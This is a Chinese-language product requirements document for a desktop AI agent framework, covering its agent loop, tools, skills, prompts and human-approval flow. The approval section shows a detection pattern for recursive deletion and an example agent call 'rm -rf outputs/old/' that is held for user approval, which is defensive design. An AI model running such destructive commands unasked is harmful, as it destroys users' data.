---
tags: PRD, Agent框架, 产品需求
aliases: 桌面AI框架需求文档
date created: 2025-10-31 10:45
last updated: 2025-10-31 23:00
version: v3.6
---

# 桌面 AI 框架产品需求文档 (PRD)

> **版本**: v3.6
> **最后更新**: 2025-10-31
> **文档类型**: 产品需求文档 (Product Requirements Document)

---

## 📑 目录 (Table of Contents)

### 核心章节 (P0 - 必读)
1. [产品架构](#1-产品架构) - 框架总览、模块关系、核心流程
2. [Agent 流程与状态管理](#2-agent-流程与状态管理) - Agent Loop、状态管理、路由逻辑
3. [工具系统](#3-工具系统) - 三层架构、Core/Optional工具、MCP集成
4. [技能系统](#4-技能系统) - 知识包机制、SKILL.md、依赖管理
5. [HITL 人机协同](#5-hitl-人机协同) - ask_human、四层审批规则
6. [上下文管理](#6-上下文管理) - Token监控、自动压缩、KV Cache优化

### 重要章节 (P1 - 推荐阅读)
7. [模型路由系统](#7-模型路由系统) - 五种模型槽位、启发式路由
8. [多Agent协作](#8-多agent协作) - delegate_task、call_agent
9. [Agent 模板系统](#9-agent-模板系统) - SimpleAgent、GeneralAgent
10. [工作区管理](#10-工作区管理) - 会话隔离、文件安全
11. [文件处理](#11-文件处理) - 多格式支持、索引搜索
12. [会话管理](#12-会话管理) - SQLite持久化、断点续聊

### 扩展章节 (P2 - 可选阅读)
13. [安全与合规](#13-安全与合规) - HITL审批、数据隐私、合规性
14. [Prompt清单](#14-prompt清单) - 系统提示、工具描述、动态提醒
15. [快速开始](#15-快速开始) - 5分钟上手、开发第一个工具/技能

---

# 1. 产品架构

## 核心价值

1. **整体视图** - 理解框架的完整模块图
2. **模块关系** - 了解模块间的依赖和交互
3. **流程清晰** - 掌握主流程和重要子流程
4. **架构分层** - 理解五层架构设计

---

## 模块总览

框架由**8个核心模块**组成,每个模块负责特定职责:

```
桌面AI框架
├── 1. Agent模块 (智能决策层)
│   ├── SimpleAgent (无状态、快速响应)
│   └── GeneralAgent (有状态、完整功能)
│
├── 2. 工具系统 (能力扩展层)
│   ├── Core工具 (6个始终可用)
│   ├── Optional工具 (12个可选)
│   └── MCP工具 (外部集成)
│
├── 3. 技能系统 (知识包层)
│   ├── 内置技能 (6个: pdf/docx/xlsx/pptx/artifacts/skill-creator)
│   ├── SKILL.md (文档)
│   └── scripts/ (脚本)
│
├── 4. 模型路由 (推理引擎层)
│   ├── 5种模型槽位 (base/reason/vision/code/chat)
│   ├── 自动多模态检测
│   └── 启发式路由策略
│
├── 5. 状态管理 (持久化层)
│   ├── AppState (29个字段)
│   ├── LangGraph Checkpointer (SQLite)
│   └── 消息历史管理
│
├── 6. 上下文管理 (资源优化层)
│   ├── Token监控 (三级阈值)
│   ├── 自动压缩 (LLM + 截断)
│   └── KV Cache优化
│
├── 7. HITL系统 (人机协同层)
│   ├── ask_human (主动提问)
│   ├── 四层审批规则
│   └── ApprovalToolNode
│
└── 8. 工作区管理 (文件隔离层)
    ├── 会话隔离目录
    ├── 技能链接
    └── 文件上传处理
```

---

## 模块关系图

### 依赖关系

```
                ┌─────────────┐
                │   用户输入   │
                └──────┬──────┘
                       │
                       ▼
        ┌──────────────────────────┐
        │   Agent模块 (决策中心)    │
        │  - SimpleAgent           │
        │  - GeneralAgent          │
        └──┬───────────────────┬───┘
           │                   │
           ▼                   ▼
    ┌─────────────┐     ┌─────────────┐
    │  模型路由    │     │  工具系统    │
    │  (推理)      │     │  (执行)      │
    └──────┬──────┘     └──────┬──────┘
           │                   │
           │                   ▼
           │            ┌─────────────┐
           │            │  技能系统    │
           │            │  (知识)      │
           │            └──────┬──────┘
           │                   │
           ▼                   ▼
    ┌─────────────────────────────┐
    │      工作区管理 (隔离)       │
    └──────────────┬──────────────┘
                   │
                   ▼
            ┌─────────────┐
            │  状态管理    │
            │  (持久化)    │
            └─────────────┘
                   │
                   ▼
            ┌─────────────┐
            │  上下文管理  │
            │  (优化)      │
            └─────────────┘
```

### 各模块在框架中的作用

**核心协作链**:
```
用户请求
  → Agent (分析任务)
  → 模型路由 (选择模型)
  → LLM推理 (生成plan)
  → 工具系统 (执行操作)
  → 技能系统 (提供知识)
  → 工作区 (文件操作)
  → 状态管理 (保存结果)
  → Agent (总结响应)
  → 用户
```

**辅助协作**:
- **HITL ↔ Agent**: Agent主动提问或请求审批
- **上下文管理 ↔ 状态管理**: 监控Token使用率,触发压缩
- **模型路由 ↔ 上下文管理**: KV Cache优化,降低成本

---

## 核心流程: Agent Loop

### 流程图
```
START → agent ⇄ tools → agent → finalize → END
         ↑_______↓
```

### 节点说明

**1. Planner节点** (核心):
- **职责**: LLM分析任务,决策是否调用工具
- **输入**: 用户消息 + 对话历史 + 系统提示
- **输出**: AIMessage (包含tool_calls或final_response)
- **路由**:
  - 有tool_calls → Tools节点
  - 无tool_calls → Finalize节点

**2. Tools节点**:
- **职责**: 执行LLM生成的工具调用
- **输入**: AIMessage中的tool_calls列表
- **输出**: ToolMessage列表(工具执行结果)
- **特性**: 支持HITL审批(ApprovalToolNode包装)

**3. Finalize节点**:
- **职责**: 最终响应处理和状态清理
- **操作**:
  - 清理多余消息历史(保留最近N条)
  - 更新循环计数
  - 保存状态到checkpointer
- **输出**: 最终响应给用户

**4. Summarization节点**(条件触发):
- **职责**: 自动压缩上下文
- **触发条件**: Token使用率>95% / 工具调用
- **操作**:
  - 保留近期消息(15%窗口或10条)
  - LLM总结旧消息
  - 紧急时直接截断
- **输出**: 压缩后的消息列表

### 路由逻辑

**agent_route** (Planner节点后):
```python
if loops >= max_loops:
    return "finalize"  # 达到最大循环次数

if needs_compression and not auto_compressed:
    return "summarization"  # 需要压缩

if last_message.tool_calls:
    return "tools"  # 有工具调用

return "finalize"  # 完成任务
```

**tools_route** (Tools节点后):
```python
return "planner"  # 总是返回Planner继续推理
```

---

## 重要子流程

### 1. 工具动态加载流程

```
用户输入: "@fetch_web 获取这个网页"
  │
  ▼
CLI解析 @mention
  │
  ▼
mention_classifier 分类
  ├─ tool? → tool_registry.load_on_demand("fetch_web")
  ├─ skill? → 生成"请阅读SKILL.md"提醒
  └─ agent? → 加载delegate_task工具
  │
  ▼
Planner节点
  - bind_tools(visible_tools)  ← 包含fetch_web
  - 生成工具调用
  │
  ▼
Tools节点执行
```

### 2. 技能动态加载流程

```
用户输入: "@pdf 处理这个表单 #form.pdf"
  │
  ├─ 解析@mention: "pdf"
  └─ 解析#filename: "form.pdf"
  │
  ▼
WorkspaceManager.link_skill("pdf")
  │
  ├─ 检查 requirements.txt
  ├─ 自动安装依赖 (首次)
  └─ 创建符号链接: workspace/skills/pdf/
  │
  ▼
生成提醒
  - "请阅读 skills/pdf/SKILL.md"
  - "可用工具: run_bash_command执行脚本"
  │
  ▼
Agent读取SKILL.md
  │
  ▼
Agent按文档指导执行任务
```

### 3. HITL审批流程

```
Agent生成工具调用: run_bash_command("rm -rf outputs/old/")
  │
  ▼
ApprovalToolNode拦截
  │
  ▼
ApprovalChecker.check(tool_name, args)
  │
  ├─ Layer 1: Tool Custom Checker → 无规则
  ├─ Layer 2: Global Risk Patterns → 匹配"rm\\s+-rf"
  ├─ Result: needs_approval=True, risk_level="high"
  │
  ▼
触发interrupt
  │
  ▼
CLI显示审批界面
  🛡️  工具审批: run_bash_command
     原因: 检测到危险命令(递归删除)
     命令: rm -rf outputs/old/
     批准? [y/n] >
  │
  ▼
用户输入决策
  ├─ y → 执行工具,返回结果
  └─ n → 拒绝执行,返回"User rejected"
  │
  ▼
恢复Agent执行
```

### 4. 上下文自动压缩流程

```
Planner节点执行后
  │
  ▼
更新 cumulative_prompt_tokens
  │
  ▼
检查使用率: tokens / context_window
  │
  ├─ <75% → 无操作
  ├─ 75-85% → 记录INFO日志
  ├─ 85-95% → 记录WARNING日志
  └─ >95% → 设置needs_compression=True
  │
  ▼
agent_route检查needs_compression
  │
  ▼
路由到Summarization节点
  │
  ▼
压缩执行
  ├─ 保留SystemMessage
  ├─ 保留近期消息 (15%窗口或10条)
  ├─ LLM总结旧消息
  └─ 设置auto_compressed=True
  │
  ▼
返回Planner节点
  - Agent继续回答用户问题
  - 用户无感知(静默压缩)
```

### 5. 多Agent协作流程(delegate_task)

```
MainAgent决定委派任务
  │
  ▼
调用 delegate_task("分析这个PDF文件")
  │
  ▼
创建Subagent
  ├─ context_id: "subagent-{uuid}"
  ├─ messages: [task_description]  ← 只有任务描述!
  ├─ mentioned_agents: 继承自Main
  ├─ active_skill: 继承自Main
  ├─ workspace_path: 继承自Main
  └─ uploaded_files: 继承自Main
  │
  ▼
Subagent执行
  ├─ 读取文件
  ├─ 使用工具
  └─ (可选)ask_human提问
  │
  ▼
检测响应长度
  ├─ <200字符 → 自动请求详细总结(最多1次)
  └─ ≥200字符 → 接受结果
  │
  ▼
返回总结给MainAgent
  - 包含:做了什么、发现了什么、结果是什么
  │
  ▼
MainAgent继续执行
```

### 6. 模型路由流程

```
Planner准备调用LLM
  │
  ▼
ModelRegistry.prefer(
    phase="plan",
    require_tools=True,
    need_code=False,
    need_vision=False
)
  │
  ▼
路由逻辑
  ├─ 检测多模态内容? → vision模型
  ├─ 需要工具 + 需要代码? → code模型
  ├─ 需要工具 + 偏好推理? → reasoning模型
  ├─ 需要工具? → chat模型
  └─ 其他 → base模型
  │
  ▼
返回选中的模型
  │
  ▼
invoke_planner(model, messages)
  │
  ▼
LLM生成响应
```

---

## 架构分层

### 五层架构设计

```
┌─────────────────────────────────────────────┐
│           应用层 (Application Layer)         │
│  - 用户自定义Agent                           │
│  - 业务特定工作流                            │
└────────────────┬────────────────────────────┘
                 │
┌────────────────▼────────────────────────────┐
│           接口层 (Interface Layer)           │
│  - CLI交互界面                               │
│  - Web界面(计划中)                          │
│  - API接口(TS SDK,计划中)                   │
└────────────────┬────────────────────────────┘
                 │
┌────────────────▼────────────────────────────┐
│        业务编排层 (Orchestration Layer)      │
│  - Agent Loop (Planner/Tools/Finalize)      │
│  - 状态管理 (AppState)                       │
│  - 路由逻辑 (agent_route/tools_route)       │
│  - HITL协同 (ask_human/approval)            │
└────────────────┬────────────────────────────┘
                 │
┌────────────────▼────────────────────────────┐
│           能力层 (Capability Layer)          │
│  - 工具系统 (18个内置工具)                  │
│  - 技能系统 (6个内置技能)                   │
│  - 模型路由 (5种模型槽位)                   │
│  - 多Agent协作 (delegate_task/call_agent)   │
└────────────────┬────────────────────────────┘
                 │
┌────────────────▼────────────────────────────┐
│      基础设施层 (Infrastructure Layer)       │
│  - 上下文管理 (Token监控/自动压缩)          │
│  - 工作区管理 (文件隔离)                    │
│  - 会话持久化 (SQLite Checkpointer)         │
│  - 可观测性 (LangSmith/日志)                │
│  - 配置管理 (Pydantic Settings)             │
└─────────────────────────────────────────────┘
```

### 层级职责

**应用层** (Application Layer):
- **职责**: 基于框架构建具体应用
- **示例**: 桌面搜索Agent、文档处理Agent、代码审查Agent
- **扩展点**: 自定义Agent模板、业务工作流

**接口层** (Interface Layer):
- **职责**: 用户交互界面
- **当前**: CLI交互(流式输出、命令系统)
- **计划**: Web界面、TS SDK
- **特性**: 会话管理、文件上传、@mention解析

**业务编排层** (Orchestration Layer):
- **职责**: Agent执行流程编排
- **核心**: Agent Loop (ReAct模式)
- **组件**:
  - AppState: 状态字段
  - Planner: LLM推理和决策
  - Tools: 工具执行
  - Finalize: 响应处理
  - Routing: 条件路由
- **特性**: HITL集成、状态持久化

**能力层** (Capability Layer):
- **职责**: 提供可复用的能力模块
- **工具系统**: 内置工具,三层架构,MCP协议
- **技能系统**: 内置技能,知识包机制
- **模型路由**: 多种模型槽位,自动选择
- **多Agent**: delegate_task(同类型),call_agent(跨类型)

**基础设施层** (Infrastructure Layer):
- **职责**: 提供底层支撑服务
- **上下文管理**: Token监控、自动压缩、KV Cache优化
- **工作区管理**: 会话隔离、技能链接、路径安全
- **会话持久化**: SQLite Checkpointer,<500ms恢复
- **可观测性**: LangSmith追踪、结构化日志
- **配置管理**: Pydantic Settings,自动.env加载

---

## 数据流

### 消息流

```
用户输入 (HumanMessage)
  ↓
Planner节点
  ├─ 输入: [SystemMessage, ...history, HumanMessage]
  └─ 输出: AIMessage(content + tool_calls)
  ↓
Tools节点
  ├─ 输入: AIMessage.tool_calls
  └─ 输出: [ToolMessage1, ToolMessage2, ...]
  ↓
Planner节点 (再次推理)
  ├─ 输入: [...history, AIMessage, ToolMessage1, ToolMessage2]
  └─ 输出: AIMessage(final_response)
  ↓
Finalize节点
  └─ 输出: 最终响应给用户
```

### 状态流

```
初始化
  ↓
AppState {
    messages: [],
    todos: [],
    loops: 0,
    cumulative_prompt_tokens: 0,
    mentioned_agents: [],
    active_skill: None,
    ...
}
  ↓
每轮Planner执行
  ├─ 更新 cumulative_prompt_tokens
  ├─ 更新 loops += 1
  └─ (可能)设置 needs_compression=True
  ↓
每轮Tools执行
  ├─ 更新 messages (追加ToolMessage)
  └─ (可能)更新 todos
  ↓
Finalize节点
  ├─ 清理多余messages (保留最近N条)
  └─ 保存到Checkpointer
  ↓
下一轮
  ├─ 从Checkpointer加载状态
  └─ 继续执行
```

### 文件流

```
用户上传: #report.pdf
  ↓
file_processor.py
  ├─ 拷贝到 workspace/uploads/report.pdf
  ├─ 检测格式: PDF
  └─ 生成提醒: "可用 @pdf 技能处理"
  ↓
(用户@mention: @pdf)
  ↓
WorkspaceManager.link_skill("pdf")
  ├─ 符号链接: workspace/skills/pdf/
  └─ 安装依赖(首次)
  ↓
Agent使用工具
  ├─ read_file("uploads/report.pdf") → 读取预览
  ├─ search_file("uploads/report.pdf", "关键词") → 搜索内容
  └─ run_bash_command("python skills/pdf/scripts/...") → 执行脚本
  ↓
生成输出
  └─ write_file("outputs/result.pdf")
```

## 参考代码位置

| 模块 | 主要文件路径 |
|------|-------------|
| **Agent Loop** | `generalAgent/graph/builder.py` |
| **Planner节点** | `generalAgent/graph/nodes/planner.py` |
| **Tools节点** | `generalAgent/graph/nodes/tools.py` |
| **Finalize节点** | `generalAgent/graph/nodes/finalize.py` |
| **Summarization节点** | `generalAgent/graph/nodes/summarization.py` |
| **路由逻辑** | `generalAgent/graph/routing.py` |
| **AppState** | `generalAgent/graph/state.py` |
| **工具系统** | `generalAgent/tools/` |
| **技能系统** | `generalAgent/skills/`, `skills/` |
| **模型路由** | `generalAgent/models/registry.py` |
| **HITL** | `generalAgent/hitl/` |
| **上下文管理** | `generalAgent/context/`, `generalAgent/graph/nodes/summarization.py` |
| **工作区管理** | `generalAgent/persistence/workspace.py` |
| **CLI交互** | `generalAgent/cli.py`, `shared/cli/base_cli.py` |

---

# 15. 快速开始

## 5分钟上手

**1. 安装依赖**
```bash
# Python 3.12+
uv sync
# 或: pip install -e .
```

**2. 启动应用**
```bash
uv run main.py
```

**3. 第一次对话**
```
User> 你好,请介绍一下你的能力
Agent> [介绍工具和技能]

User> @pdf 帮我填写这个表单
Agent> [加载PDF技能,执行任务]
```

### 开发第一个工具

**创建自定义工具** (5分钟):
```python
# generalAgent/tools/custom/my_tool.py
from langchain_core.tools import tool

@tool
def my_custom_tool(query: str) -> str:
    """你的工具描述"""
    return f"处理结果: {query}"
```

**配置工具**:
```yaml
# generalAgent/config/tools.yaml
optional:
  my_custom_tool:
    enabled: true
    category: "custom"
    tags: ["custom"]
```

### 开发第一个技能

**创建技能目录** (10分钟):
```bash
mkdir -p skills/my_skill
cd skills/my_skill
```

**创建SKILL.md**:
```markdown
# My Skill

## 功能
描述技能的功能和使用方法

## 使用步骤
1. 步骤1
2. 步骤2
```

**配置技能**:
```yaml
# generalAgent/config/skills.yaml
optional:
  my_skill:
    enabled: true
    description: "我的自定义技能"
```
---

# 14. Prompt清单

## 产品定位

Prompt清单章节汇总框架中所有与LLM交互的提示词,包括Agent系统提示、工具描述、技能文档模板、动态提醒和HITL交互界面,为产品经理、开发者和维护者提供完整的提示词管理参考。

本章节不是实现细节,而是**Prompt资产目录**,说明"系统有哪些Prompt"和"每个Prompt的作用和位置"。

### 核心价值

1. **全局视图** - 一站式查看所有Prompt资源
2. **维护指南** - 快速定位和修改Prompt
3. **质量保证** - 确保Prompt的一致性和准确性
4. **成本优化** - 识别冗长Prompt,优化Token消耗

---

## Prompt分类总览

框架中的Prompt分为**5大类**:

```
Prompt清单
├── 1. Agent系统提示 (System Prompts)
│   ├── PLANNER_SYSTEM_PROMPT (主Agent)
│   └── SUBAGENT_SYSTEM_PROMPT (子Agent)
│
├── 2. 工具描述 (Tool Descriptions)
│   ├── Core工具 (6个)
│   ├── Optional工具 (12个)
│   └── MCP工具 (外部)
│
├── 3. 技能文档模板 (Skill Templates)
│   ├── SKILL.md结构模板
│   └── 6个内置技能的SKILL.md
│
├── 4. 动态提醒 (Dynamic Reminders)
│   ├── TODO列表提醒
│   ├── @mention加载提醒
│   ├── 文件上传提醒
│   └── 上下文压缩提醒
│
└── 5. HITL交互界面 (HITL UI)
    ├── ask_human提问界面
    └── 工具审批界面
```

**统计数据**:
- **总Prompt数**: ~30个
- **最大Prompt**: PLANNER_SYSTEM_PROMPT (~8000 tokens)
- **最小Prompt**: now工具描述 (~50 tokens)
- **总Token消耗**: ~15K tokens/轮 (包含工具描述)

---

## 1. Agent系统提示

### 1.1 PLANNER_SYSTEM_PROMPT (主Agent)

**用途**: GeneralAgent的核心系统提示,定义Agent身份、能力、工作流程和约束

**位置**: `generalAgent/graph/prompts.py:PLANNER_SYSTEM_PROMPT`

**结构**:
```
1. 身份定义 (~200 tokens)
   - 你是GeneralAgent

2. 核心能力 (~500 tokens)
   - 工具调用
   - 技能使用
   - 文件操作
   - 多模态处理

3. 工作流程 (~800 tokens)
   - Agent Loop步骤
   - 工具可见性规则
   - 技能加载流程
   - delegate_task使用场景

4. 技能目录 (~2000 tokens, 动态生成)
   - enabled技能列表
   - 每个技能的描述和用途
   - 自动加载规则

5. 约束和最佳实践 (~500 tokens)
   - 不要使用不存在的工具
   - 总是使用read_file读取SKILL.md
   - 委派任务时给出详细描述

6. 时间戳 (~50 tokens, 分钟级)
   <current_datetime>2025-10-31 20:00 UTC</current_datetime>
```

**Token估算**:
- 固定部分: ~4000 tokens
- 技能目录: ~2000 tokens (6个技能)
- **总计**: ~6000 tokens (会话期间不变, KV Cache友好)

**关键设计**:
- ✅ **固定内容**: 系统提示在会话初始化时生成,之后不变
- ✅ **技能目录过滤**: 只包含`enabled: true`的技能

**参考代码**: `generalAgent/graph/prompts.py:19-150`

---

### 1.2 SUBAGENT_SYSTEM_PROMPT (子Agent)

**用途**: delegate_task创建的子Agent的系统提示,专注于单一任务执行

**位置**: `generalAgent/graph/prompts.py:SUBAGENT_SYSTEM_PROMPT`

**结构**:
```
1. 身份定义 (~150 tokens)
   - 你是Subagent
   - 由MainAgent委派特定任务

2. 上下文说明 (~200 tokens)
   - 你看不到主对话历史
   - 只能看到任务描述

3. 工作要求 (~300 tokens)
   - 专注完成当前任务
   - 生成详细总结(>200字符)
   - 包含:做了什么、发现了什么、结果是什么

4. 时间戳 (~50 tokens)
   <current_datetime>2025-10-31 20:00 UTC</current_datetime>
```

**参考代码**: `generalAgent/graph/prompts.py:152-180`

---

## 2. 工具描述

所有工具的描述通过LangChain的`@tool`装饰器自动生成,包含工具名称、参数说明和使用示例。

**Core工具** (6个,始终可见):
- FR-PROMPT-001: now - 获取当前UTC时间
- FR-PROMPT-002: todo_write - 创建和更新TODO列表
- FR-PROMPT-003: todo_read - 读取TODO列表
- FR-PROMPT-004: delegate_task - 委派任务给子Agent
- FR-PROMPT-005: call_agent - 调用其他类型的Agent
- FR-PROMPT-006: ask_human - 向用户提问

**Optional工具** (10个,可选加载):
- FR-PROMPT-007: read_file - 读取文件内容
- FR-PROMPT-008: write_file - 写入文件
- FR-PROMPT-009: edit_file - 精确编辑文件
- FR-PROMPT-010: find_files - 按名称查找文件
- FR-PROMPT-011: search_file - 搜索文件内容
- FR-PROMPT-012: list_workspace_files - 列出工作区文件
- FR-PROMPT-013: fetch_web - 获取网页内容
- FR-PROMPT-014: search_web - 搜索网页
- FR-PROMPT-015: run_bash_command - 执行bash命令
- FR-PROMPT-016: compact_context - 手动压缩上下文

**工具描述示例** (now工具):
```python
"""Get current UTC time in ISO 8601 format.

Returns:
    str: Current UTC time (e.g., "2025-10-31T20:00:00Z")

Example:
    now() -> "2025-10-31T20:00:00Z"
"""
```

**Token估算**:
- Core工具: ~1200 tokens (6个 × ~200 tokens)
- Optional工具: ~1800 tokens (10个 × ~180 tokens)

**参考代码**: `generalAgent/tools/builtin/*.py`

---

## 3. 技能文档模板

### 3.1 SKILL.md标准结构

所有技能的SKILL.md遵循统一结构:

# {技能名称}

## 概述
简要说明技能用途和适用场景(2-3句话)

## 使用场景
- 场景1: 描述
- 场景2: 描述
- 场景3: 描述

## 使用方法

### 步骤1: 准备工作
详细说明第一步操作...

### 步骤2: 执行任务
详细说明第二步操作...

### 步骤3: 验证结果
如何检查任务完成情况...

## 可用脚本

### script1.py
- **用途**: 脚本功能说明
- **参数**:
  - arg1: 说明
  - arg2: 说明
- **示例**:
  ```bash
  python skills/{skill_id}/scripts/script1.py arg1 arg2
  ```

## 注意事项
- 注意点1
- 注意点2

## 参考资料
- 链接1
- 链接2

**Token估算**: 500-1500 tokens/技能

---

### 3.2 内置参考技能SKILL.md清单

**FR-PROMPT-017**: pdf技能 (~1200 tokens)
- 位置: `skills/pdf/SKILL.md`
- 用途: PDF处理(表单填写、内容提取、合并拆分)

**FR-PROMPT-018**: docx技能 (~1000 tokens)
- 位置: `skills/docx/SKILL.md`
- 用途: Word文档处理(内容提取、样式修改、表格操作)

**FR-PROMPT-019**: xlsx技能 (~1100 tokens)
- 位置: `skills/xlsx/SKILL.md`
- 用途: Excel表格处理(数据读写、公式计算、图表生成)

**FR-PROMPT-020**: pptx技能 (~900 tokens)
- 位置: `skills/pptx/SKILL.md`
- 用途: PowerPoint处理(内容提取、幻灯片生成)

**FR-PROMPT-021**: artifacts技能 (~800 tokens)
- 位置: `skills/artifacts/SKILL.md`
- 用途: 生成可交互内容(HTML/SVG/Mermaid/React)

**FR-PROMPT-022**: skill-creator技能 (~700 tokens)
- 位置: `skills/skill-creator/SKILL.md`
- 用途: 辅助创建新技能包

---

## 4. 动态提醒

动态提醒在运行时生成,追加到最后一条 HumanMessage 末尾,实现KV Cache友好。

### 4.1 TODO列表提醒

**触发条件**: 存在未完成的TODO项

**格式**:
```xml
<system_reminder>
Your todo list has changed. Here are the latest contents:

[1. [completed] Read requirements
2. [in_progress] Write code
3. [pending] Run tests]

Continue with the current task if applicable.
</system_reminder>
```

**Token估算**: 50-200 tokens

**生成位置**: `generalAgent/graph/prompts.py:build_dynamic_reminders()`

---

### 4.2 @mention加载提醒

**触发条件**: 用户使用@mention加载工具或技能

**格式** (工具):
```xml
<system_reminder>
Tool '@fetch_web' has been loaded and is now available for use.
</system_reminder>
```

**格式** (技能):
```xml
<system_reminder>
Skill '@pdf' has been linked to workspace.

Please read the skill documentation:
- read_file("skills/pdf/SKILL.md")

Then follow the instructions to complete the task.
Available tool: run_bash_command (for executing scripts)
</system_reminder>
```

**Token估算**: 30-100 tokens/提醒

**生成位置**: `generalAgent/cli.py:process_mentions()`

---

### 4.3 文件上传提醒

**触发条件**: 用户上传文件(通过#filename语法)

**格式**:
```xml
<system_reminder>
File uploaded: report.pdf
- Location: uploads/report.pdf
- Format: PDF
- Size: 2.5 MB

Suggested actions:
- read_file("uploads/report.pdf") for preview
- search_file("uploads/report.pdf", "keyword") for content search
- @pdf for PDF-specific operations
</system_reminder>
```

**Token估算**: 50-150 tokens/文件

**生成位置**: `generalAgent/cli.py:process_file_uploads()`

---

## 5. HITL交互界面

### 5.1 ask_human提问界面

**用途**: Agent主动向用户提问

**格式**:
```
💬 {question}

{context (如果提供)}

(默认: {default}) >
```

**示例**:
```
💬 您希望报告以什么格式输出?

支持的格式: PDF, Markdown, HTML

(默认: markdown) > PDF
```

**Token估算**: 提问内容的token数 + ~20 tokens (格式化)

**生成位置**: `generalAgent/cli.py:handle_ask_human()`

---

### 5.2 工具审批界面

**用途**: 危险工具需要用户审批

**格式**:
```
🛡️  工具审批: {tool_name}

原因: {reason}
风险级别: {risk_level}

参数:
  {arg1}: {value1}
  {arg2}: {value2}

批准执行? [y/n] >
```

**示例**:
```
🛡️  工具审批: run_bash_command

原因: 检测到危险命令(递归删除)
风险级别: high

参数:
  command: rm -rf outputs/old/
  timeout: 30

批准执行? [y/n] > n

❌ 已拒绝执行
```

**Token估算**: 参数内容的token数 + ~50 tokens (格式化)

**生成位置**: `generalAgent/cli.py:handle_approval_request()`

---

## 参考代码位置

| Prompt类型 | 主要文件路径 |
|------------|-------------|
| **Agent系统提示** | `generalAgent/graph/prompts.py` |
| **工具描述** | `generalAgent/tools/builtin/*.py`, `generalAgent/tools/custom/*.py` |
| **技能文档** | `skills/*/SKILL.md` |
| **动态提醒构建** | `generalAgent/graph/prompts.py:build_dynamic_reminders()` |
| **TODO提醒** | `generalAgent/graph/prompts.py:181-195` |
| **@mention提醒** | `generalAgent/cli.py:process_mentions()` |
| **文件上传提醒** | `generalAgent/cli.py:process_file_uploads()` |
| **ask_human界面** | `generalAgent/cli.py:handle_ask_human()` |
| **审批界面** | `generalAgent/cli.py:handle_approval_request()` |

---

# 3. 工具系统

## 产品定位

工具系统是框架的能力扩展层,通过标准化的LangChain @tool装饰器接口,为AI Agent提供与外部世界交互的能力。系统采用三层架构(discovered/enabled/runtime)和@mention按需加载机制,让开发者能够以分钟级速度添加新工具,同时保证企业级安全(四层审批机制)和MCP协议兼容性。

**核心价值**:
- **快速扩展**: 创建Python文件即自动发现,零配置接入
- **开箱即用**: 内置工具覆盖文件操作、网络请求、任务管理、多Agent协作
- **按需加载**: @mention机制节省token,仅加载需要的工具
- **安全可控**: 四层HITL审批规则,检测危险操作

---

## 核心工具清单

### 核心工具(Core Tools)

| 工具名称 | 功能 | 使用场景 |
|---------|------|---------|
| `now` | 获取当前UTC时间 | 生成带时间戳的报告 |
| `todo_write` | 创建/更新任务列表 | 任务追踪和进度管理 |
| `todo_read` | 读取任务状态 | 检查任务完成情况 |
| `delegate_task` | 委派任务给Subagent | 分解复杂任务 |
| `call_agent` | 调用其他Agent | Multi-Agent协作 |
| `ask_human` | 向用户提问 | HITL交互 |

### 文件操作工具

| 工具名称 | 功能 | 支持格式 |
|---------|------|---------|
| `read_file` | 读取文件内容 | TXT, PDF, DOCX, XLSX, PPTX |
| `write_file` | 写入文件 | TXT, JSON, Markdown |
| `edit_file` | 精确字符串替换 | 所有文本格式 |
| `find_files` | 文件名模式匹配 | Glob模式(如`*.pdf`) |
| `search_file` | 文件内容搜索 | 文本文件和文档 |
| `list_workspace_files` | 列出工作区文件 | 全部格式 |

### 网络工具

| 工具名称 | 功能 | API |
|---------|------|-----|
| `fetch_web` | 获取网页内容 | Jina Reader |
| `search_web` | 搜索引擎查询 | Google Custom Search |

### 执行工具

| 工具名称 | 功能 | 安全控制 |
|---------|------|---------|
| `run_bash_command` | 执行Shell命令 | HITL审批(默认禁用@mention) |

### 上下文管理工具

| 工具名称 | 功能 | 触发时机 |
|---------|------|---------|
| `compact_context` | 手动压缩上下文 | Token使用率>75%时动态加载 |

---

## 三层架构

### 架构设计

```
ToolRegistry
├── _discovered (所有扫描到的工具)
│   ├── builtin tools (18个内置工具)
│   └── custom tools (用户自定义)
│
├── _tools (启动时加载的工具)
│   ├── core tools (always enabled)
│   └── optional tools (enabled: true)
│
└── runtime visible tools (每个会话可见的工具)
    ├── persistent tools (全局工具)
    ├── @mentioned tools (按需加载)
    └── skill allowed tools (技能权限)
```

### 工具加载流程

```
1. 扫描阶段(启动时)
   - 扫描 generalAgent/tools/builtin/
   - 扫描 generalAgent/tools/custom/
   - 存入 _discovered

2. 初始化阶段(启动时)
   - 加载 core tools (always enabled)
   - 加载 optional tools (enabled: true)
   - 存入 _tools

3. 运行时阶段(每个会话)
   - 持久化工具(默认可见)
   - @mention 动态加载
   - 技能工具继承
```

---

## 配置管理

配置文件:`generalAgent/config/tools.yaml`

```yaml
# Core tools - Always enabled
core:
  now:
    category: "meta"
    tags: ["meta", "time"]
    description: "Get current UTC time"

  todo_write:
    category: "meta"
    tags: ["meta", "task"]
    description: "Create/update TODO list"

# Optional tools - Can be enabled/disabled
optional:
  fetch_web:
    enabled: true                  # Load at startup
    available_to_subagent: true    # Subagent can inherit
    category: "network"
    tags: ["network", "read", "web"]
    description: "Fetch web pages using Jina Reader"

  run_bash_command:
    enabled: false                 # Require @mention
    category: "execution"
    tags: ["execute", "bash", "shell"]
    description: "Execute bash commands (dangerous)"
```

---

## MCP协议集成

### 支持的MCP工具服务器

框架支持通过MCP (Model Context Protocol) 集成外部工具:

```bash
# .mcp-config.json
{
  "mcpServers": {
    "filesystem": {
      "command": "npx",
      "args": ["-y", "@modelcontextprotocol/server-filesystem@0.6.0", "/Users/user/projects"]
    },
    "brave-search": {
      "command": "npx",
      "args": ["-y", "@modelcontextprotocol/server-brave-search@0.6.3"],
      "env": {
        "BRAVE_API_KEY": "your-key"
      }
    }
  }
}
```

### MCP工具转换

MCP工具自动转换为LangChain工具:

```
MCP Tool Schema → LangChain @tool
├── name → tool.name
├── description → tool.description
├── inputSchema → tool.args_schema
└── handler → tool.func
```

---
## 功能需求

### Core工具需求

#### FR-TOOL-001: now工具 - 时间获取

**需求描述**:
系统应提供获取当前UTC时间的工具,支持Agent生成带时间戳的内容。

**核心能力**:
- ✅ 返回当前UTC时间
- ✅ ISO 8601格式: `2025-10-31T20:00:00Z`
- ✅ 无参数,即时返回
- ✅ 始终可用(Core工具)

**使用场景**:
- 生成报告时添加时间戳
- 记录事件发生时间
- 计算时间差和持续时间
- 生成带日期的文件名

**验收标准**:
- ✅ 返回格式符合ISO 8601标准
- ✅ 时区为UTC(避免时区混淆)
